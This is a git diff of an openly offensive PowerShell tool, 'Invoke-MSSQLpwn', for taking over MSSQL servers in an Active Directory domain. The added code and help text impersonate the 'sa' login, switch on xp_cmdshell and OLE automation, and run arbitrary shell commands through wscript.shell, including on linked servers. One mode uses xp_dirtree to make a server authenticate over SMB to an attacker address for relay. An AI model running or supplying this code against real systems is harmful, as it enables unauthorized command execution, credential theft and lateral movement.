@@ -54,11 +54,28 @@ Function Get-AuthenticatedServers {
 }
 
 Function Invoke-MSSQLpwn{
+    <#
+    .SYNOPSIS
+      PowerShell Tool to gain code execution on MSSQL servers in an Active Directory Environment                                       
+    .EXAMPLE
+     Invoke-MSSQLpwn -Enumerate
+     This will find MSSQL service principal names within the current domain, attempt to authenticate as the current user, enumerate permissions on the server, and find linked servers.
+    .EXAMPLE
+     Invoke-MSSQLpwn -Target "server1" -Impersonate "sa" -Command "whoami"
+     This will authenticate to server1 as the current user, attempt to impersonate the sa login, enable xp_cmdshell, and execute the given command.
+    .EXAMPLE
+     Invoke-MSSQLpwn -Target "server1" -Relay "192.168.1.5"
+     This will authenticate to server1 and execute the xp_dirtree stored procedure to connect to the specified attacking server over SMB.
+     .EXAMPLE
+     Invoke-MSSQLpwn -Target "server1" -Link "server2" -ImpersonateLink "sa" -Command "whoami"
+     This will authenticate to server1 as the current user, connect to the linked server, attempt to impersonate the sa login on the linked server, enable xp_cmdshell on the linked server, and execute the given command on the linked server. Command output will not be displayed.
+    .EXAMPLE
+     Invoke-MSSQLpwn -Target "server1" -Link "server2" -Relay "192.168.1.5"
+     This will authenticate to server1 as the current user, connect to the linked server, and execute the xp_dirtree stored procedure on the linked server.
+  #>
     param (
         [parameter(Mandatory=$false)]
         [Switch]$Enumerate,
-        [parameter(Mandatory=$false)]
-        [Switch]$FollowTheLink,
         [parameter(Mandatory=$false)]
         [String]$Relay,
         [Parameter(Mandatory=$false)]
@@ -71,8 +88,6 @@ Function Invoke-MSSQLpwn{
         [String]$Command,
         [Parameter(Mandatory=$false)]
         [String]$database,
-        [Parameter(Mandatory=$false)]
-        [String]$linkdatabase,
         [Parameter(Mandatory=$false)]
         [Int]$Mode,
         [Parameter(Mandatory=$false)]
@@ -183,6 +198,7 @@ Function Invoke-MSSQLpwn{
     #>
     if (!($PSBoundParameters.ContainsKey('Enumerate')) -And !($PSBoundParameters.ContainsKey('Target'))){
         Write-Host "[!] " -foregroundcolor red -nonewline; Write-Host "Must specify '-Enumerate' or '-Target'" -foregroundcolor yellow
+        help Invoke-MSSQLpwn -examples
         return
     }
     if (!($PSBoundParameters.ContainsKey('database'))){
@@ -229,7 +245,7 @@ Function Invoke-MSSQLpwn{
             $reader = $sqlCmd.ExecuteReader()
             $reader.Close()
 
-            $sqlCmd.CommandText = "DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'cmd /c ""echo Test > C:\\Tools\\file.txt""';"
+            $sqlCmd.CommandText = "DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'cmd /c ""{0}""';" -f $Command
             $reader = $sqlCmd.ExecuteReader()
             Write-Host "Command output: " -foregroundcolor yellow;
             while ($reader.Read()){
@@ -274,6 +290,29 @@ Function Invoke-MSSQLpwn{
             return
         }
         if ($Mode -eq 2){
+            if ($PSBoundParameters.ContainsKey('Impersonate')){
+            $sqlCmd.CommandText = "EXECUTE AS LOGIN = '{0}';" -f $Impersonate;
+            $reader = $sqlCmd.ExecuteReader()
+            $reader.Close()
+            }
+            if ($PSBoundParameters.ContainsKey('LinkImpersonate')){
+                $sqlCmd.CommandText = 'SELECT 1 FROM openquery("{0}",''SELECT 1;EXECUTE AS LOGIN = ''''{1}'''';EXEC sp_configure ''''Ole Automation Procedures'''', 1; RECONFIGURE;'')' -f $Link,$LinkImpersonate
+            }else {
+                $sqlCmd.CommandText = 'SELECT 1 FROM openquery("{0}",''SELECT 1;EXEC sp_configure ''''Ole Automation Procedures'''', 1; RECONFIGURE;'')' -f $Link
+            }
+            $reader = $sqlCmd.ExecuteReader()
+            $reader.Close()
+
+            if ($PSBoundParameters.ContainsKey('LinkImpersonate')){
+                $sqlCmd.CommandText = 'SELECT 1 FROM openquery("{0}",''SELECT 1;EXECUTE AS LOGIN = ''''{1}'''';EXEC xp_cmdshell ''''{2}'''';'')' -f $Link,$LinkImpersonate,$Command
+            }else {
+                $sqlCmd.CommandText = 'SELECT 1 FROM openquery("{0}",''SELECT 1;DECLARE @myshell INT; EXEC sp_oacreate ''''wscript.shell'''', @myshell OUTPUT; EXEC sp_oamethod @myshell, ''''run'''', null, ''''cmd /c "{1}"'''';'')' -f $Link,$Command
+            }
+            $reader = $sqlCmd.ExecuteReader()
+            while ($reader.Read()){
+                $reader[0]
+            }
+            $reader.Close() 
         } else {
             if ($PSBoundParameters.ContainsKey('Impersonate')){
             $sqlCmd.CommandText = "EXECUTE AS LOGIN = '{0}';" -f $Impersonate;
